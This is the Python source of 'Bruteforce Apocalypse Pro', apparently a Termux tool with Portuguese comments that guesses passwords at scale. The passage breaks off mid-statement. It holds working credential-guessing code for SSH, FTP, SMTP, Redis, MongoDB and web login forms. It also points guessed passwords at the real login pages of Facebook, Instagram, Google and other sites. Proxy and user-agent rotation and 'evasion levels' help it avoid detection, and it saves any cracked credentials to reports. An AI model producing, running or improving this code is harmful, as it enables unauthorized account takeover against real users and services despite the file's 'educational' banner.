#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import socket
import paramiko
import ftplib
import smtplib
import requests
import mechanize
import warnings
import asyncio
import aiohttp
import json
import csv
from threading import Thread, Lock
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, BarColumn, TimeRemainingColumn
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.text import Text
from rich.markdown import Markdown
from rich.layout import Layout
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# Ignorar warnings de SSL
warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.filterwarnings("ignore", category=UserWarning)

console = Console()

class BruteforceApocalypsePro:
    def __init__(self):
        self.wordlists = {
            'rockyou': '/data/data/com.termux/files/usr/share/wordlists/rockyou.txt',
            'custom': None
        }
        self.protocols = {
            'http': {'port': 80, 'handler': self._http_attack},
            'https': {'port': 443, 'handler': self._http_attack},
            'ssh': {'port': 22, 'handler': self._ssh_attack},
            'ftp': {'port': 21, 'handler': self._ftp_attack},
            'smtp': {'port': 25, 'handler': self._smtp_attack},
            'rdp': {'port': 3389, 'handler': self._rdp_attack},
            'redis': {'port': 6379, 'handler': self._redis_attack},
            'mongodb': {'port': 27017, 'handler': self._mongodb_attack}
        }
        self.social_media = {
            'facebook': {'url': 'https://facebook.com/login', 'fields': {'email': 'email', 'pass': 'pass'}},
            'instagram': {'url': 'https://instagram.com/accounts/login', 'fields': {'username': 'username', 'password': 'password'}},
            'twitter': {'url': 'https://twitter.com/i/flow/login', 'fields': {'username': 'username', 'password': 'password'}},
            'linkedin': {'url': 'https://linkedin.com/login', 'fields': {'session_key': 'session_key', 'session_password': 'session_password'}},
            'google': {'url': 'https://accounts.google.com/login', 'fields': {'Email': 'Email', 'Passwd': 'Passwd'}},
            'reddit': {'url': 'https://reddit.com/login', 'fields': {'username': 'username', 'password': 'password'}},
            'pinterest': {'url': 'https://pinterest.com/login', 'fields': {'email': 'email', 'password': 'password'}},
            'tumblr': {'url': 'https://tumblr.com/login', 'fields': {'email': 'email', 'password': 'password'}},
            'yahoo': {'url': 'https://login.yahoo.com', 'fields': {'username': 'username', 'passwd': 'passwd'}},
            'wordpress': {'url': '/wp-login.php', 'fields': {'log': 'log', 'pwd': 'pwd'}}
        }
        self.current_attempts = 0
        self.success = False
        self.stop_thread = False
        self.lock = Lock()
        self.proxies = []
        self.current_proxy = None
        self.threads = 4
        self.timeout = 30
        self.delay = (1, 5)
        self.user_agents = self._load_user_agents()
        self.current_target = None
        self.attempts_per_second = 0
        self.report_data = []
        self.jitter = 0.5
        self.evasion_level = 1
        self.max_retries = 3
        
        self._check_dependencies()
        self._load_proxies()
        self._create_folders()

    def _create_folders(self):
        folders = ['reports', 'wordlists', 'logs']
        for folder in folders:
            if not os.path.exists(folder):
                os.makedirs(folder)

    def _load_user_agents(self):
        ua_file = 'user_agents.txt'
        if os.path.exists(ua_file):
            with open(ua_file, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        else:
            return [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Mobile/15E148 Safari/604.1'
            ]

    def _check_dependencies(self):
        required = {
            'paramiko': 'paramiko',
            'mechanize': 'mechanize',
            'rich': 'rich',
            'requests': 'requests',
            'aiohttp': 'aiohttp',
            'asyncssh': 'asyncssh'
        }
        
        missing = []
        for pkg, install_name in required.items():
            try:
                __import__(pkg)
            except ImportError:
                missing.append(install_name)
        
        if missing:
            console.print(Panel.fit(
                f"[red]✗ Dependências faltando: {', '.join(missing)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
            if Confirm.ask("Deseja instalar automaticamente?"):
                self._install_dependencies(missing)

    def _install_dependencies(self, packages):
        with Progress() as progress:
            task = progress.add_task("[cyan]Instalando dependências...[/cyan]", total=len(packages))
            for pkg in packages:
                os.system(f"pip install {pkg} --quiet > /dev/null 2>&1")
                progress.update(task, advance=1)
        console.print("[green]✓ Dependências instaladas com sucesso![/green]")
        time.sleep(1)

    def _load_proxies(self):
        proxy_files = ['proxies.txt', 'socks_proxies.txt']
        for proxy_file in proxy_files:
            if os.path.exists(proxy_file):
                with open(proxy_file, 'r') as f:
                    self.proxies.extend([line.strip() for line in f if line.strip()])
        if self.proxies:
            self.current_proxy = random.choice(self.proxies)

    def _rotate_proxy(self):
        if self.proxies:
            self.current_proxy = random.choice(self.proxies)
            return {
                'http': f'http://{self.current_proxy}',
                'https': f'http://{self.current_proxy}'
            }
        return None

    def _show_banner(self):
        banners = [
            """
[bold green]
██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗  █████╗ ███████╗███████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██████╔╝███████║███████╗█████╗  
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══██╗██╔══██║╚════██║██╔══╝  
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║██║  ██║███████║███████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
[/bold green]
[bold white on green]       BRUTEFORCE APOCALYPSE PRO v5.0[/bold white on green]
[bold yellow]  Advanced Multi-Protocol Bruteforce Toolkit[/bold yellow]
""",
            """
[bold red]
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌          
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌          ▐░▌     ▐░▌            ▐░▌▐░▌          
▐░▌          ▐░▌      ▐░▌  ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ 
▐░▌          ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀            ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
[/bold red]
[bold white on red]      BRUTEFORCE APOCALYPSE PRO v5.0[/bold white on red]
[bold yellow]     The Ultimate Password Cracking Tool[/bold yellow]
"""
        ]
        
        console.print(random.choice(banners))
        console.print(Panel.fit(
            "[blink bold red]⚠️ FOR EDUCATIONAL PURPOSES ONLY! ⚠️[/blink bold red]",
            style="red on black"
        ))

    def _clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def _create_wordlist(self):
        console.print(Panel.fit(
            "[bold red]WORDLIST CREATOR[/bold red]",
            border_style="red"
        ))
        
        filename = Prompt.ask("[yellow]?[/yellow] Filename", default="wordlist.txt")
        options = {
            '1': "Common passwords",
            '2': "Custom list",
            '3': "Combine words",
            '4': "Generate patterns",
            '5': "From user/pass folders"
        }
        
        console.print("\n[bold]Options:[/bold]")
        for key, value in options.items():
            console.print(f"  [cyan]{key}[/cyan] - {value}")
        
        choice = Prompt.ask("[yellow]?[/yellow] Select type", choices=options.keys())
        passwords = []
        
        if choice == '1':
            passwords = [
                '123456', 'password', '123456789', '12345', '12345678',
                'qwerty', '1234567', '111111', '1234567890', '123123'
            ] + [f"Password{i}" for i in range(1, 21)]
        elif choice == '2':
            while True:
                pwd = Prompt.ask("[yellow]+[/yellow] Add password (empty to stop)")
                if not pwd:
                    break
                passwords.append(pwd)
        elif choice == '3':
            base_words = Prompt.ask("[yellow]?[/yellow] Base words (comma separated)").split(',')
            suffixes = ['123', '!', '2023', '1', '?', '']
            passwords = [f"{word}{suffix}" for word in base_words for suffix in suffixes]
        elif choice == '4':
            prefixes = ['admin', 'user', 'root', 'test']
            suffixes = ['', '123', '!', '2023']
            numbers = [str(i).zfill(2) for i in range(0, 100)]
            passwords = [f"{prefix}{suffix}{num}" 
                        for prefix in prefixes 
                        for suffix in suffixes 
                        for num in numbers]
        elif choice == '5':
            user_folder = Prompt.ask("[yellow]?[/yellow] Path to usernames folder")
            pass_folder = Prompt.ask("[yellow]?[/yellow] Path to passwords folder")
            
            users = []
            passwords = []
            
            if os.path.exists(user_folder):
                for file in os.listdir(user_folder):
                    with open(os.path.join(user_folder, file), 'r', errors='ignore') as f:
                        users.extend([line.strip() for line in f if line.strip()])
            
            if os.path.exists(pass_folder):
                for file in os.listdir(pass_folder):
                    with open(os.path.join(pass_folder, file), 'r', errors='ignore') as f:
                        passwords.extend([line.strip() for line in f if line.strip()])
            
       
            combined = [f"{user}:{password}" for user in users for password in passwords]
            passwords = combined
        
        try:
            with open(os.path.join('wordlists', filename), 'w') as f:
                f.write('\n'.join(passwords))
            
            console.print(f"[green]✓ Wordlist created: {filename}[/green]")
            self.wordlists['custom'] = filename
            time.sleep(1)
        except Exception as e:
            console.print(f"[red]✗ Error: {str(e)}[/red]")
            time.sleep(2)

    def _select_protocol(self):
        console.print(Panel.fit(
            "[bold red]SELECT PROTOCOL[/bold red]",
            border_style="red"
        ))
        
        for i, (proto, data) in enumerate(self.protocols.items(), 1):
            console.print(f"  [cyan]{i}[/cyan] - {proto.upper()} (port {data['port']})")
        
        choice = IntPrompt.ask("[yellow]?[/yellow] Select protocol", choices=[str(i) for i in range(1, len(self.protocols)+1)])
        return list(self.protocols.keys())[choice-1]

    def _select_social_media(self):
        console.print(Panel.fit(
            "[bold red]SELECT SOCIAL MEDIA[/bold red]",
            border_style="red"
        ))
        
        for i, (media, data) in enumerate(self.social_media.items(), 1):
            console.print(f"  [cyan]{i}[/cyan] - {media.capitalize()}")
        
        choice = IntPrompt.ask("[yellow]?[/yellow] Select platform", choices=[str(i) for i in range(1, len(self.social_media)+1)])
        return list(self.social_media.keys())[choice-1]

    def _auto_target_detection(self, url):
    
        try:
            headers = {'User-Agent': random.choice(self.user_agents)}
            response = requests.get(url, verify=False, timeout=10, headers=headers)
            
            if "wp-login.php" in response.text:
                return "WordPress"
            elif "administrator" in response.text:
                return "Joomla"
            elif "user/login" in response.text:
                return "Drupal"
            elif "facebook" in url:
                return "Facebook"
            elif "twitter" in url:
                return "Twitter"
            return "Generic Web Form"
        except:
            return "Unknown"

    def _configure_attack(self):
        console.print(Panel.fit(
            "[bold red]ATTACK CONFIGURATION[/bold red]",
            border_style="red"
        ))
        
        self.threads = IntPrompt.ask("[yellow]?[/yellow] Number of threads", default=4)
        self.timeout = IntPrompt.ask("[yellow]?[/yellow] Timeout (seconds)", default=30)
        self.max_retries = IntPrompt.ask("[yellow]?[/yellow] Max retries", default=3)
        
        min_delay = IntPrompt.ask("[yellow]?[/yellow] Minimum delay (seconds)", default=1)
        max_delay = IntPrompt.ask("[yellow]?[/yellow] Maximum delay (seconds)", default=5)
        self.delay = (min_delay, max_delay)
        
        self.jitter = Prompt.ask("[yellow]?[/yellow] Jitter factor (0.1-1.0)", default="0.5")
        self.evasion_level = IntPrompt.ask("[yellow]?[/yellow] Evasion level (1-5)", choices=['1','2','3','4','5'])
        
        if self.proxies and Confirm.ask("[yellow]?[/yellow] Use proxy rotation?"):
            console.print(f"[cyan]Loaded {len(self.proxies)} proxies[/cyan]")

    def _apply_evasion(self):
        """Aplica técnicas de evasão baseadas no nível selecionado"""
        if self.evasion_level >= 2:
            time.sleep(random.uniform(0, self.jitter))
        
        if self.evasion_level >= 3:
            # Rotaciona User-Agent a cada 10 tentativas
            if self.current_attempts % 10 == 0:
                headers = {'User-Agent': random.choice(self.user_agents)}
                return headers
        
        if self.evasion_level >= 4:
            # Adiciona delays aleatórios
            time.sleep(random.uniform(*self.delay))
        
        return {'User-Agent': random.choice(self.user_agents)}

    async def _async_http_attack(self, target, username, password):
    
        try:
            headers = self._apply_evasion()
            headers.update({
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive'
            })
            
            async with aiohttp.ClientSession() as session:
                async with session.get(target, headers=headers, ssl=False) as resp:
                    content = await resp.text()
                    
              
                    if 'login' in content.lower() or 'password' in content.lower():
                        data = {
                            'username': username,
                            'password': password,
                            'submit': 'Login'
                        }
                        
                        async with session.post(target, data=data, headers=headers, ssl=False) as post_resp:
                            if post_resp.status != 200:
                                return False
                            
                            post_content = await post_resp.text()
                            if 'invalid' not in post_content.lower() and 'error' not in post_content.lower():
                                return True
            return False
        except:
            return False

    def _http_attack(self, target, username, password):
        for attempt in range(self.max_retries):
            try:
                headers = self._apply_evasion()
                headers.update({
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive'
                })
                
                session = requests.Session()
                session.proxies = self._rotate_proxy()
                session.verify = False
         
                resp = session.get(target, headers=headers, timeout=self.timeout)
                
                # Try to find login form
                br = mechanize.Browser()
                br.set_handle_robots(False)
                br.addheaders = [('User-agent', headers['User-Agent'])]
                br.open(target)
                br.select_form(nr=0)
                
           
                field_names = ['email', 'username', 'user', 'login']
                pass_names = ['password', 'pass', 'pwd']
                
                for field in field_names:
                    try:
                        br.form[field] = username
                        break
                    except:
                        continue
                
                for pass_field in pass_names:
                    try:
                        br.form[pass_field] = password
                        break
                    except:
                        continue
                
                response = br.submit()
                
            
                if "login" not in response.geturl() and "invalid" not in response.read().decode().lower():
                    return True
                
                time.sleep(random.uniform(*self.delay))
                return False
                
            except Exception as e:
                if attempt == self.max_retries - 1:
                    return False
                time.sleep(1)

    def _ssh_attack(self, target, username, password):
        for attempt in range(self.max_retries):
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target.split(':')[0], 
                          port=int(target.split(':')[1]) if ':' in target else 22,
                          username=username, 
                          password=password,
                          timeout=self.timeout,
                          banner_timeout=200)
                ssh.close()
                return True
            except:
                if attempt == self.max_retries - 1:
                    time.sleep(random.uniform(*self.delay))
                    return False
                time.sleep(1)

    def _rdp_attack(self, target, username, password):
    
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((target.split(':')[0], int(target.split(':')[1]) if ':' in target else 3389))
            s.close()
            return True  # Apenas verifica se a porta está aberta
        except:
            return False

    def _redis_attack(self, target, username, password):
      
        try:
            from redis import Redis
            r = Redis(
                host=target.split(':')[0],
                port=int(target.split(':')[1]) if ':' in target else 6379,
                password=password,
                socket_timeout=self.timeout
            )
            return r.ping()
        except:
            return False

    def _mongodb_attack(self, target, username, password):
   
        try:
            from pymongo import MongoClient
            client = MongoClient(
                host=target.split(':')[0],
                port=int(target.split(':')[1]) if ':' in target else 27017,
                username=username,
                password=password,
                serverSelectionTimeoutMS=self.timeout*1000
            )
            return client.admin.command('ismaster') is not None
        except:
            return False

    def _ftp_attack(self, target, username, password):
        for attempt in range(self.max_retries):
            try:
                ftp = ftplib.FTP()
                ftp.connect(target.split(':')[0], 
                           int(target.split(':')[1]) if ':' in target else 21,
                           timeout=self.timeout)
                ftp.login(user=username, passwd=password)
                ftp.quit()
                return True
            except:
                if attempt == self.max_retries - 1:
                    time.sleep(random.uniform(*self.delay))
                    return False
                time.sleep(1)

    def _smtp_attack(self, target, username, password):
        for attempt in range(self.max_retries):
            try:
                server = smtplib.SMTP(target.split(':')[0], 
                                     int(target.split(':')[1]) if ':' in target else 25,
                                     timeout=self.timeout)
                server.starttls()
                server.login(username, password)
                server.quit()
                return True
            except:
                if attempt == self.max_retries - 1:
                    time.sleep(random.uniform(*self.delay))
                    return False
                time.sleep(1)

    def _social_media_attack(self, target, username, password, platform):
    
        try:
            platform_data = self.social_media[platform]
            login_url = platform_data['url'] if platform_data['url'].startswith('http') else target + platform_data['url']
            
            session = requests.Session()
            session.proxies = self._rotate_proxy()
            session.verify = False
            
       
            headers = self._apply_evasion()
            session.get(login_url, headers=headers, timeout=self.timeout)
       
            form_data = {
                platform_data['fields']['username']: username,
                platform_data['fields']['password']: password
            }
            
            # Enviar requisição de login
            response = session.post(login_url, data=form_data, headers=headers, timeout=self.timeout)
            
            # Verificar se o login foi bem-sucedido
            if response.status_code == 200:
                if 'login' not in response.url.lower() and 'error' not in response.text.lower():
                    return True
            
            return False
        except:
            return False

    def _attack_worker(self, target, protocol, username, passwords, progress, task):
        start_time = time.time()
        attempts = 0
        
        for password in passwords:
            if self.stop_thread:
                break
            
            with self.lock:
                self.current_attempts += 1
                attempts += 1
                progress.update(task, advance=1)
                
                # Calculate attempts per second
                elapsed = time.time() - start_time
                if elapsed > 0:
                    self.attempts_per_second = attempts / elapsed
            
            if protocol in self.social_media:
                result = self._social_media_attack(target, username, password, protocol)
            else:
                result = self.protocols[protocol]['handler'](target, username, password)
            
            if result:
                with self.lock:
                    self.success = True
                    self.stop_thread = True
                    progress.stop()
                    
                    # Adiciona ao relatório
                    self.report_data.append({
                        'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'protocol': protocol,
                        'target': target,
                        'username': username,
                        'password': password,
                        'attempts': self.current_attempts,
                        'time_elapsed': time.time() - start_time
                    })
                    
                    self._save_report()
                    
                    console.print(Panel.fit(
                        f"[green]✓ CREDENTIALS FOUND![/green]\n"
                        f"Protocol: [bold]{protocol.upper()}[/bold]\n"
                        f"Target: [bold]{target}[/bold]\n"
                        f"Username: [bold]{username}[/bold]\n"
                        f"Password: [bold]{password}[/bold]",
                        border_style="green"
                    ))
                    return
            
            if self.stop_thread:
                break

    async def _async_attack_worker(self, target, protocol, username, passwords):
        """Worker assíncrono para ataques HTTP"""
        start_time = time.time()
        attempts = 0
        
        for password in passwords:
            if self.stop_thread:
                break
            
            with self.lock:
                self.current_attempts += 1
                attempts += 1
                
                # Calculate attempts per second
                elapsed = time.time() - start_time
                if elapsed > 0:
                    self.attempts_per_second = attempts / elapsed
            
            if protocol == 'http' or protocol == 'https':
                result = await self._async_http_attack(target, username, password)
            else:
                result = False
            
            if result:
                with self.lock:
                    self.success = True
                    self.stop_thread = True
                    
                    # Adiciona ao relatório
                    self.report_data.append({
                        'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'protocol': protocol,
                        'target': target,
                        'username': username,
                        'password': password,
                        'attempts': self.current_attempts,
                        'time_elapsed': time.time() - start_time
                    })
                    
                    self._save_report()
                    
                    console.print(Panel.fit(
                        f"[green]✓ CREDENTIALS FOUND![/green]\n"
                        f"Protocol: [bold]{protocol.upper()}[/bold]\n"
                        f"Target: [bold]{target}[/bold]\n"
                        f"Username: [bold]{username}[/bold]\n"
                        f"Password: [bold]{password}[/bold]",
                        border_style="green"
                    ))
                    return
            
            if self.stop_thread:
                break

    def _save_report(self):
     
        if not self.report_data:
            return
        
        report_dir = 'reports'
        if not os.path.exists(report_dir):
            os.makedirs(report_dir)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # JSON Report
        json_file = os.path.join(report_dir, f'report_{timestamp}.json')
        with open(json_file, 'w') as f:
            json.dump(self.report_data, f, indent=4)
        
        # CSV Report
        csv_file = os.path.join(report_dir, f'report_{timestamp}.csv')
        with open(csv_file, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=self.report_data[0].keys())
            writer.writeheader()
            writer.writerows(self.report_data)
        
        # HTML Report
        html_file = os.path.join(report_dir, f'report_{timestamp}.html')
        with open(html_file, 'w') as f:
            f.write("<html><head><title>Bruteforce Report</title></head><body>")
            f.write("<h1>Bruteforce Attack Report</h1>")
            f.write("<table border='1'><tr>")
            for key in self.report_data[0].keys():
                f.write(f"<th>{key}</th>")
            f.write("</tr>")
            
            for item in self.report_data:
                f.write("<tr>")
                for value in item.values():
                    f.write(f"<td>{value}</td>")
                f.write("</tr>")
            
            f.write("</table></body></html>")
        
        console.print(f"[green]✓ Reports saved to {report_dir}/[/green]")

    def run_attack(self, target, protocol, username, wordlist):
        self.current_attempts = 0
        self.success = False
        self.stop_thread = False
        self.current_target = target
        self.report_data = []
        
        try:
            with open(wordlist, 'r', errors='ignore') as f:
                passwords = f.read().splitlines()
        except Exception as e:
            console.print(f"[red]✗ Error reading wordlist: {str(e)}[/red]")
            return
        
        total = len(passwords)
        chunk_size = len(passwords) // self.threads
        threads = []
        
        progress = Progress(
            "[progress.description]{task.description}",
            BarColumn(),
            "[progress.percentage]{task.percentage:>3.0f}%",
            TimeRemainingColumn()
        )
        
        with progress:
            task = progress.add_task("[red]Attacking...[/red]", total=total)
            
            # Se for HTTP/HTTPS e tivermos aiohttp, usa async
            if (protocol == 'http' or protocol == 'https') and 'aiohttp' in sys.modules:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                
                chunks = [passwords[i:i + chunk_size] for i in range(0, len(passwords), chunk_size)]
                tasks = []
                
                for chunk in chunks:
                    task = self._async_attack_worker(target, protocol, username, chunk)
                    tasks.append(task)
                
                loop.run_until_complete(asyncio.gather(*tasks))
                loop.close()
            else:
                for i in range(self.threads):
                    start = i * chunk_size
                    end = None if i == self.threads-1 else (i+1) * chunk_size
                    chunk = passwords[start:end]
                    
                    thread = Thread(
                        target=self._attack_worker,
                        args=(target, protocol, username, chunk, progress, task)
                    )
                    thread.daemon = True
                    threads.append(thread)
                    thread.start()
                
                while any(t.is_alive() for t in threads):
                    if self.stop_thread:
                        break
                    
                    time.sleep(0.5)
                
                for thread in threads:
                    thread.join()
            
            if not self.success:
                progress.stop()
                console.print("[red]✗ Attack completed - no valid credentials found[/red]")

    def _show_stats(self):
        console.print(Panel.fit(
            f"[bold]ATTACK STATISTICS[/bold]\n"
            f"Attempts: [red]{self.current_attempts}[/red]\n"
            f"Status: {'[green]SUCCESS[/green]' if self.success else '[red]FAILURE[/red]'}\n"
            f"Threads: [yellow]{self.threads}[/yellow]\n"
            f"Speed: [cyan]{self.attempts_per_second:.2f} tries/sec[/cyan]\n"
            f"Proxy: [blue]{self.current_proxy or 'None'}[/blue]\n"
            f"Evasion Level: [magenta]{self.evasion_level}[/magenta]",
            border_style="blue"
        ))

    def _show_main_menu(self):
        layout = Layout()
        layout.split_column(
            Layout(name="header", size=3),
            Layout(name="main"),
            Layout(name="footer", size=3)
        )
        
        layout["header"].update(Panel.fit(
            "[bold red]BRUTEFORCE APOCALYPSE PRO v5.0[/bold red]",
            border_style="red"
        ))
        
        menu_table = Table.grid(padding=1)
        menu_table.add_column(style="cyan")
        menu_table.add_column()
        
        menu_table.add_row("1", "Standard Bruteforce")
        menu_table.add_row("2", "Social Media Attack")
        menu_table.add_row("3", "Auto Target Bruteforce")
        menu_table.add_row("4", "Credential Combiner")
        menu_table.add_row("5", "Wordlist Tools")
        menu_table.add_row("6", "Proxy Manager")
        menu_table.add_row("7", "Settings")
        menu_table.add_row("8", "View Reports")
        menu_table.add_row("0", "Exit")
        
        layout["main"].update(Panel.fit(menu_table))
        layout["footer"].update(Panel.fit(
            f"[blink yellow]Target: {self.current_target or 'None'} | Threads: {self.threads} | Evasion: Lvl {self.evasion_level}[/blink yellow]",
            border_style="yellow"
        ))
        
        console.print(layout)

    def _proxy_manager(self):
        console.print(Panel.fit(
            "[bold red]PROXY MANAGER[/bold red]",
            border_style="red"
        ))
        
        options = {
            '1': "View loaded proxies",
            '2': "Add proxies manually",
            '3': "Import from file",
            '4': "Test all proxies",
            '5': "Clear proxy list"
        }
        
        for key, value in options.items():
            console.print(f"  [cyan]{key}[/cyan] - {value}")
        
        choice = Prompt.ask("[yellow]?[/yellow] Select option", choices=options.keys())
        
        if choice == '1':
            console.print(f"\n[bold]Loaded proxies:[/bold] {len(self.proxies)}")
            for proxy in self.proxies[:10]:  # Mostra apenas os 10 primeiros
                console.print(f"  [yellow]{proxy}[/yellow]")
            if len(self.proxies) > 10:
                console.print(f"  ... and {len(self.proxies)-10} more")
        
        elif choice == '2':
            while True:
                proxy = Prompt.ask("[yellow]+[/yellow] Add proxy (host:port) (empty to stop)")
                if not proxy:
                    break
                self.proxies.append(proxy.strip())
            console.print(f"[green]✓ {len(self.proxies)} proxies loaded[/green]")
        
        elif choice == '3':
            files = [f for f in os.listdir() if f.endswith('.txt')]
            if not files:
                console.print("[red]✗ No .txt files found in current directory[/red]")
            else:
                for i, f in enumerate(files, 1):
                    console.print(f"  [cyan]{i}[/cyan] - {f}")
                file_choice = IntPrompt.ask("[yellow]?[/yellow] Select file", choices=[str(i) for i in range(1, len(files)+1)])
                selected_file = files[file_choice-1]
                
                with open(selected_file, 'r') as f:
                    new_proxies = [line.strip() for line in f if line.strip()]
                self.proxies.extend(new_proxies)
                console.print(f"[green]✓ Added {len(new_proxies)} proxies from {selected_file}[/green]")
        
        elif choice == '4':
            if not self.proxies:
                console.print("[red]✗ No proxies loaded[/red]")
            else:
                with Progress() as progress:
                    task = progress.add_task("[cyan]Testing proxies...[/cyan]", total=len(self.proxies))
                    working_proxies = []
                    
                    for proxy in self.proxies:
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(5)
                            host, port = proxy.split(':')
                            s.connect((host, int(port)))
                            s.close()
                            working_proxies.append(proxy)
                        except:
                            pass
                        progress.update(task, advance=1)
                
                self.proxies = working_proxies
                console.print(f"[green]✓ {len(working_proxies)}/{len(self.proxies)} proxies working[/green]")
        
        elif choice == '5':
            self.proxies = []
            console.print("[green]✓ Proxy list cleared[/green]")
        
        input("\nPress Enter to continue...")

    def _view_reports(self):
        console.print(Panel.fit(
            "[bold red]VIEW REPORTS[/bold red]",
            border_style="red"
        ))
        
        if not os.path.exists('reports'):
            console.print("[red]✗ No reports directory found[/red]")
            input("\nPress Enter to continue...")
            return
        
        reports = []
        for root, dirs, files in os.walk('reports'):
            for file in files:
                if file.endswith(('.json', '.csv', '.html')):
                    reports.append(os.path.join(root, file))
        
        if not reports:
            console.print("[red]✗ No reports found[/red]")
            input("\nPress Enter to continue...")
            return
        
        for i, report in enumerate(reports, 1):
            console.print(f"  [cyan]{i}[/cyan] - {os.path.basename(report)}")
        
        choice = IntPrompt.ask("[yellow]?[/yellow] Select report to view", choices=[str(i) for i in range(1, len(reports)+1)])
        selected_report = reports[choice-1]
        
        if selected_report.endswith('.json'):
            with open(selected_report, 'r') as f:
                data = json.load(f)
                console.print_json(data=data)
        elif selected_report.endswith('.csv'):
            with open(selected_report, 'r') as f:
                reader = csv.DictReader(f)
                table = Table(title="Report Data")
                
                for field in reader.fieldnames:
                    table.add_column(field)
                
                for row in reader:
                    table.add_row(*[row[field] for field in reader.fieldnames])
                
                console.print(table)
        elif selected_report.endswith('.html'):
            console.print(f"[yellow]HTML report saved at: {selected_report}[/yellow]")
        
        input("\nPress Enter to continue...")

    def auto_bruteforce(self, url):
    
        target_type = self._auto_target_detection(url)
        
        console.print(Panel.fit(
            f"[bold]AUTO DETECTION RESULTS[/bold]\n"
            f"URL: [red]{url}[/red]\n"
            f"Type: [yellow]{target_type}[/yellow]",
            border_style="blue"
        ))
        
        if target_type == "WordPress":
            username = "admin"
            wordlist = self.wordlists['rockyou']
            self.run_attack(url, 'http', username, wordlist)
        elif target_type == "Joomla":
            username = "admin"
            wordlist = self.wordlists['rockyou']
            self.run_attack(url, 'http', username, wordlist)
        elif target_type in ["Facebook", "Twitter", "Instagram"]:
            username = Prompt.ask("[yellow]?[/yellow] Enter username/email")
            wordlist = self.wordlists['rockyou']
            self.run_attack(url, target_type.lower(), username, wordlist)
        else:
            console.print("[red]✗ Automatic attack not supported for this target type[/red]")

    def run(self):
        self._clear_screen()
        self._show_banner()
        
        while True:
            self._show_main_menu()
            
            options = {
                '1': "Standard Bruteforce",
                '2': "Social Media Attack",
                '3': "Auto Target Bruteforce",
                '4': "Credential Combiner",
                '5': "Wordlist Tools",
                '6': "Proxy Manager",
                '7': "Settings",
                '8': "View Reports",
                '0': "Exit"
            }
            
            choice = Prompt.ask("[blink yellow]➤[/blink yellow] Select option", choices=options.keys())
            
            if choice == '1':
                protocol = self._select_protocol()
                target = Prompt.ask("[yellow]?[/yellow] Enter target (host:port)", default="example.com")
                username = Prompt.ask("[yellow]?[/yellow] Enter username")
                
                wordlist = self.wordlists['rockyou']  # Default wordlist
                if Confirm.ask("[yellow]?[/yellow] Use custom wordlist?", default=False):
                    custom = Prompt.ask("[yellow]?[/yellow] Enter wordlist path")
                    if os.path.exists(custom):
                        wordlist = custom
                    else:
                        console.print("[red]✗ Wordlist file not found[/red]")
                        continue
                
                console.print(Panel.fit(
                    f"[bold]ATTACK SUMMARY[/bold]\n"
                    f"Protocol: [red]{protocol.upper()}[/red]\n"
